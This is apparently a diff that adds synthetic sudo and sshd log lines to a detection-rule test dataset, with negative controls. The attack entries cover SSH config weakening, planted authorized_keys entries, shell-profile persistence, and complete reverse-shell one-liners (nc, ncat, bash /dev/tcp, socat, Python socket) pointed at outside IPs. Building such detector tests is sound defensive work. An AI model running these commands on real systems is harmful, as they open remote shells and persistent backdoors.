@@ -723,4 +723,366 @@ Dec 21 20:00:20 webserver sudo[10404]: root : TTY=pts/3 ; PWD=/root ; USER=root 
 Dec 21 20:00:30 webserver sudo[10405]: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ps aux
 Dec 21 18:05:00 webserver sudo[10010]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl status auditd
 Dec 21 18:05:05 webserver sudo[10011]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl restart auditd
+# === ATTACK SCENARIO 26: SSH Configuration Modification (Dec 21 20:00) ===
+# Attacker weakens SSH authentication controls after obtaining sudo access
+
+Dec 21 20:00:00 webserver sshd[11000]: Accepted password for alice from 198.51.100.24 port 55000 ssh2
+Dec 21 20:00:00 webserver sshd[11000]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Dec 21 20:00:01 webserver systemd-logind[500]: New session 90 of user alice.
+
+# Enable direct root SSH login
+Dec 21 20:01:00 webserver sudo[11010]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
+
+# Enable SSH password authentication
+Dec 21 20:01:10 webserver sudo[11011]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+
+# Allow empty passwords
+Dec 21 20:01:20 webserver sudo[11012]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitEmptyPasswords no/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
+
+# Disable public-key authentication
+Dec 21 20:01:30 webserver sudo[11013]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/' /etc/ssh/sshd_config
+
+# Modify commented PermitRootLogin configuration
+Dec 21 20:01:40 webserver sudo[11014]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/sed -i 's/#PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
+
+# Modify SSH drop-in configuration
+Dec 21 20:02:00 webserver sudo[11015]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config.d/99-custom.conf
+
+# Another SSH drop-in modification
+Dec 21 20:02:10 webserver sudo[11016]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config.d/backdoor.conf
+
+# Disable public key authentication in drop-in configuration
+Dec 21 20:02:20 webserver sudo[11017]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/' /etc/ssh/sshd_config.d/security.conf
+
+# Reload SSH service after configuration changes
+Dec 21 20:02:30 webserver sudo[11018]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl reload ssh
+
+# Restart SSH daemon
+Dec 21 20:02:40 webserver sudo[11019]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart sshd
+
+# === NEGATIVE CONTROL TESTS ===
+# These commands should NOT create ssh_config_modification findings
+
+# Secure root login by changing yes to no
+Dec 21 20:03:00 webserver sudo[11020]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
+
+# Disable password authentication
+Dec 21 20:03:10 webserver sudo[11021]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
+
+# Disable empty passwords
+Dec 21 20:03:20 webserver sudo[11022]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitEmptyPasswords yes/PermitEmptyPasswords no/' /etc/ssh/sshd_config
+
+# Enable public key authentication
+Dec 21 20:03:30 webserver sudo[11023]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/PubkeyAuthentication no/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+
+# Same dangerous-looking configuration but wrong target file
+Dec 21 20:03:40 webserver sudo[11024]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /tmp/sshd_config
+
+# Backup file should not trigger
+Dec 21 20:03:50 webserver sudo[11025]: admin : TTY=pts/6 ; PWD=/etc/ssh ; USER=root ; COMMAND=/usr/bin/sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config.backup
+
+# Completely unrelated sed command
+Dec 21 20:04:00 webserver sudo[11026]: admin : TTY=pts/6 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/sed -i 's/listen 80/listen 8080/' /etc/nginx/nginx.conf
+
+# Read SSH configuration only
+Dec 21 20:04:10 webserver sudo[11027]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/ssh/sshd_config
+
+# Check SSH configuration syntax
+Dec 21 20:04:20 webserver sudo[11028]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/sshd -t
+
+Dec 21 20:05:00 webserver sshd[11000]: pam_unix(sshd:session): session closed for user alice
+# === SSH CONFIG MODIFICATION USING TEE ===
+
+# Write directly to main SSH config
+Dec 21 20:10:00 webserver sudo[11100]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config
+
+# Append to main SSH config
+Dec 21 20:10:10 webserver sudo[11101]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee -a /etc/ssh/sshd_config
+
+# Append using long option
+Dec 21 20:10:20 webserver sudo[11102]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee --append /etc/ssh/sshd_config
+
+# Write a drop-in configuration
+Dec 21 20:10:30 webserver sudo[11103]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config.d/99-backdoor.conf
+
+# Append to another drop-in config
+Dec 21 20:10:40 webserver sudo[11104]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/tee -a /etc/ssh/sshd_config.d/custom.conf
+
+# Another SSH configuration file
+Dec 21 20:10:50 webserver sudo[11105]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/tee --append /etc/ssh/sshd_config.d/security.conf
+
+
+# === NEGATIVE CONTROL TESTS FOR TEE ===
+
+# Unrelated file
+Dec 21 20:11:00 webserver sudo[11110]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /tmp/test.conf
+
+# nginx configuration
+Dec 21 20:11:10 webserver sudo[11111]: admin : TTY=pts/6 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/tee -a /etc/nginx/nginx.conf
+
+# SSH config backup file - should NOT trigger
+Dec 21 20:11:20 webserver sudo[11112]: admin : TTY=pts/6 ; PWD=/etc/ssh ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config.backup
+
+# Similar-looking file in /tmp - should NOT trigger
+Dec 21 20:11:30 webserver sudo[11113]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /tmp/sshd_config
+
+# Directory name looks similar but is not sshd_config.d
+Dec 21 20:11:40 webserver sudo[11114]: admin : TTY=pts/6 ; PWD=/etc/ssh ; USER=root ; COMMAND=/usr/bin/tee /etc/ssh/sshd_config.old/test.conf
+# === SSH CONFIG MODIFICATION USING CP AND MV ===
+
+# Copy file over main SSH config
+Dec 21 20:20:00 webserver sudo[11200]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/sshd.conf /etc/ssh/sshd_config
+
+# Copy file into sshd_config.d
+Dec 21 20:20:10 webserver sudo[11201]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cp /tmp/backdoor.conf /etc/ssh/sshd_config.d/99-backdoor.conf
+
+# Copy with force option
+Dec 21 20:20:20 webserver sudo[11202]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp -f /tmp/custom.conf /etc/ssh/sshd_config.d/custom.conf
+
+# Move file over main SSH config
+Dec 21 20:20:30 webserver sudo[11203]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/sshd.new /etc/ssh/sshd_config
+
+# Move file into sshd_config.d
+Dec 21 20:20:40 webserver sudo[11204]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mv /tmp/persistence.conf /etc/ssh/sshd_config.d/persistence.conf
+
+# Move with force option
+Dec 21 20:20:50 webserver sudo[11205]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv -f /tmp/security.conf /etc/ssh/sshd_config.d/security.conf
+
+
+# === NEGATIVE CONTROL TESTS FOR CP/MV ===
+
+# Copy to unrelated location
+Dec 21 20:21:00 webserver sudo[11210]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test.conf /tmp/sshd_config
+
+# Copy to backup file - should NOT trigger
+Dec 21 20:21:10 webserver sudo[11211]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/sshd.conf /etc/ssh/sshd_config.backup
+
+# Move to unrelated location
+Dec 21 20:21:20 webserver sudo[11212]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/test.conf /tmp/test2.conf
+
+# Move to similarly named backup file
+Dec 21 20:21:30 webserver sudo[11213]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/sshd.conf /etc/ssh/sshd_config.old
+# === SSH AUTHORIZED_KEYS PERSISTENCE TESTS ===
+
+# Add SSH public key using echo append
+Dec 21 20:30:00 webserver sudo[11300]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtestkey attacker@lab" >> /root/.ssh/authorized_keys'
+
+# Add ED25519 key
+Dec 21 20:30:10 webserver sudo[11301]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/sh -c 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKey attacker@lab" >> /home/alice/.ssh/authorized_keys'
+
+# Overwrite authorized_keys
+Dec 21 20:30:20 webserver sudo[11302]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "ssh-rsa AAAAB3NzaNewKey redteam@lab" > /root/.ssh/authorized_keys'
+
+# Append using tee
+Dec 21 20:30:30 webserver sudo[11303]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys
+
+# Write using tee to another user's authorized_keys
+Dec 21 20:30:40 webserver sudo[11304]: alice : TTY=pts/5 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /home/deploy/.ssh/authorized_keys
+
+# Copy prepared key file into authorized_keys
+Dec 21 20:30:50 webserver sudo[11305]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/authorized_keys.backdoor /root/.ssh/authorized_keys
+
+# Copy key file into another user's account
+Dec 21 20:31:00 webserver sudo[11306]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cp /tmp/deploy_keys /home/deploy/.ssh/authorized_keys
+
+# Move prepared file into authorized_keys
+Dec 21 20:31:10 webserver sudo[11307]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/root_keys /root/.ssh/authorized_keys
+
+# Move file into another user's authorized_keys
+Dec 21 20:31:20 webserver sudo[11308]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mv /tmp/admin_keys /home/admin/.ssh/authorized_keys
+
+
+# === NEGATIVE CONTROLS ===
+
+# Read authorized_keys only
+Dec 21 20:32:00 webserver sudo[11310]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /root/.ssh/authorized_keys
+
+# Change permissions only
+Dec 21 20:32:10 webserver sudo[11311]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 600 /root/.ssh/authorized_keys
+
+# Create .ssh directory only
+Dec 21 20:32:20 webserver sudo[11312]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/mkdir -p /root/.ssh
+
+# Generate a key but do not install it
+Dec 21 20:32:30 webserver sudo[11313]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh-keygen -t rsa -N '' -f /root/.ssh/id_rsa
+
+# Copy to a similarly named backup file
+Dec 21 20:32:40 webserver sudo[11314]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test /root/.ssh/authorized_keys.backup
+
+# Move to unrelated file
+Dec 21 20:32:50 webserver sudo[11315]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/test /tmp/authorized_keys
+# === SHELL PROFILE PERSISTENCE TESTS ===
+
+# HIGH: printf writes suspicious command into .bashrc
+Dec 21 20:40:00 webserver sudo[11400]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'printf "bash /tmp/.evil.sh &" >> /root/.bashrc'
+
+# HIGH: printf writes suspicious command into .profile
+Dec 21 20:40:10 webserver sudo[11401]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/sh -c 'printf "python /dev/shm/.agent.py &" >> /home/alice/.profile'
+
+# MEDIUM: tee modifies .bashrc
+Dec 21 20:40:20 webserver sudo[11402]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee -a /root/.bashrc
+
+# MEDIUM: tee modifies .profile
+Dec 21 20:40:30 webserver sudo[11403]: alice : TTY=pts/5 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /home/deploy/.profile
+
+# MEDIUM: copy file over .bashrc
+Dec 21 20:40:40 webserver sudo[11404]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/bashrc.backdoor /root/.bashrc
+
+# MEDIUM: copy file over /etc/profile
+Dec 21 20:40:50 webserver sudo[11405]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/profile.backdoor /etc/profile
+
+# MEDIUM: move file over user .profile
+Dec 21 20:41:00 webserver sudo[11406]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/profile.new /home/deploy/.profile
+
+# MEDIUM: move file over /etc/bash.bashrc
+Dec 21 20:41:10 webserver sudo[11407]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/bashrc.new /etc/bash.bashrc
+
+# MEDIUM: sed modifies .bashrc
+Dec 21 20:41:20 webserver sudo[11408]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/export SAFE=1/export SAFE=0/' /root/.bashrc
+
+# MEDIUM: sed modifies /etc/profile
+Dec 21 20:41:30 webserver sudo[11409]: alice : TTY=pts/5 ; PWD=/etc ; USER=root ; COMMAND=/usr/bin/sed -i 's/umask 022/umask 000/' /etc/profile
+
+# MEDIUM: normal-looking profile modification
+Dec 21 20:41:40 webserver sudo[11410]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "export JAVA_HOME=/opt/java" >> /root/.bashrc'
+
+# MEDIUM: only one weak indicator
+Dec 21 20:41:50 webserver sudo[11411]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "bash /opt/admin/start.sh" >> /root/.profile'
+# === REVERSE SHELL DETECTION TESTS ===
+
+# ------------------------------------------------------------
+# 1. NETCAT / NC
+# ------------------------------------------------------------
+
+# HIGH: nc -e with bash
+Dec 21 21:00:00 webserver sudo[12000]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -e /bin/bash 198.51.100.24 4444
+
+# HIGH: nc -e with sh
+Dec 21 21:00:10 webserver sudo[12001]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nc -e /bin/sh 203.0.113.10 5555
+
+
+# ------------------------------------------------------------
+# 2. NCAT
+# ------------------------------------------------------------
+
+# HIGH: ncat --exec with bash
+Dec 21 21:01:00 webserver sudo[12010]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat --exec /bin/bash 198.51.100.24 4444
+
+# HIGH: ncat --exec with sh
+Dec 21 21:01:10 webserver sudo[12011]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat --exec /bin/sh 203.0.113.10 5555
+
+
+# ------------------------------------------------------------
+# 3. BASH / SH USING /dev/tcp
+# ------------------------------------------------------------
+
+# HIGH: bash reverse shell using /dev/tcp
+Dec 21 21:02:00 webserver sudo[12020]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.24/4444 0>&1'
+
+# HIGH: sh reverse shell using /dev/tcp
+Dec 21 21:02:10 webserver sudo[12021]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'sh -i >& /dev/tcp/203.0.113.10/5555 0>&1'
+
+# HIGH: alternate bash /dev/tcp target
+Dec 21 21:02:20 webserver sudo[12022]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.50/7777 0>&1'
+
+
+# ------------------------------------------------------------
+# 4. SOCAT
+# ------------------------------------------------------------
+
+# HIGH: socat EXEC bash
+Dec 21 21:03:00 webserver sudo[12030]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP:198.51.100.24:4444 EXEC:/bin/bash
+
+# HIGH: socat EXEC sh
+Dec 21 21:03:10 webserver sudo[12031]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP4:203.0.113.10:5555 EXEC:/bin/sh
+
+# HIGH: socat SYSTEM bash
+Dec 21 21:03:20 webserver sudo[12032]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP:198.51.100.24:6666 SYSTEM:bash -i
+
+
+# ------------------------------------------------------------
+# 5. PYTHON - socket + connect + dup2
+# ------------------------------------------------------------
+
+# HIGH: Python dup2 reverse shell using bash
+Dec 21 21:04:00 webserver sudo[12040]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os;s=socket.socket();s.connect(("198.51.100.24",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/bash")'
+
+# HIGH: Python dup2 reverse shell using sh
+Dec 21 21:04:10 webserver sudo[12041]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os;s=socket.socket();s.connect(("203.0.113.10",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh")'
+
+
+# ------------------------------------------------------------
+# 6. PYTHON - socket + connect + subprocess
+# ------------------------------------------------------------
+
+# HIGH: Python subprocess reverse shell using bash
+Dec 21 21:05:00 webserver sudo[12050]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("198.51.100.24",6666));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+
+# HIGH: Python subprocess reverse shell using sh
+Dec 21 21:05:10 webserver sudo[12051]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python -c 'import socket,subprocess;s=socket.socket();s.connect(("203.0.113.10",7777));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+
+
+# ------------------------------------------------------------
+# 7. PYTHON - socket + connect + pty.spawn
+# ------------------------------------------------------------
+
+# HIGH: Python PTY reverse shell using bash
+Dec 21 21:06:00 webserver sudo[12060]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.24",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+# HIGH: Python PTY reverse shell using sh
+Dec 21 21:06:10 webserver sudo[12061]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("203.0.113.10",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+
+# ============================================================
+# NEGATIVE CONTROLS - SHOULD NOT TRIGGER
+# ============================================================
+
+# nc port check only - no shell execution
+Dec 21 21:10:00 webserver sudo[12100]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -zv 127.0.0.1 80
+
+# ncat normal connection - no --exec
+Dec 21 21:10:10 webserver sudo[12101]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat 127.0.0.1 8080
+
+# normal bash command
+Dec 21 21:10:20 webserver sudo[12102]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'echo hello'
+
+# bash mentions ordinary file, no /dev/tcp
+Dec 21 21:10:30 webserver sudo[12103]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/admin-script.sh
+
+# socat port forwarding only - no EXEC or SYSTEM shell
+Dec 21 21:10:40 webserver sudo[12104]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
+
+# socat EXEC non-shell program
+Dec 21 21:10:50 webserver sudo[12105]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP-LISTEN:8081 EXEC:/usr/bin/id
+
+# Python local PTY shell only - no network connection
+Dec 21 21:11:00 webserver sudo[12110]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# Python socket connection only - no shell
+Dec 21 21:11:10 webserver sudo[12111]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket;s=socket.socket();s.connect(("127.0.0.1",8080))'
+
+# Python subprocess only - no socket
+Dec 21 21:11:20 webserver sudo[12112]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import subprocess;subprocess.call(["/bin/ls","-la"])'
+
+# Python dup2 only - no socket/connect/shell
+Dec 21 21:11:30 webserver sudo[12113]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import os;os.dup2(1,2)'
+
+# Python executes shell locally but has no socket connection
+Dec 21 21:11:40 webserver sudo[12114]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import os;os.system("/bin/bash -c \"echo test\"")'
+# === NEGATIVE CONTROLS ===
+
+# Read only
+Dec 21 20:42:00 webserver sudo[11420]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /root/.bashrc
+
+# Change permissions only
+Dec 21 20:42:10 webserver sudo[11421]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 644 /root/.bashrc
+
+# Change ownership only
+Dec 21 20:42:20 webserver sudo[11422]: admin : TTY=pts/6 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/chown deploy:deploy /home/deploy/.profile
+
+# Modify unrelated file
+Dec 21 20:42:30 webserver sudo[11423]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'echo "bash /tmp/test.sh &" >> /tmp/test.conf'
+
+# Copy to unrelated file
+Dec 21 20:42:40 webserver sudo[11424]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test /tmp/.bashrc.backup
 # === END OF EXPANDED DATASET ===
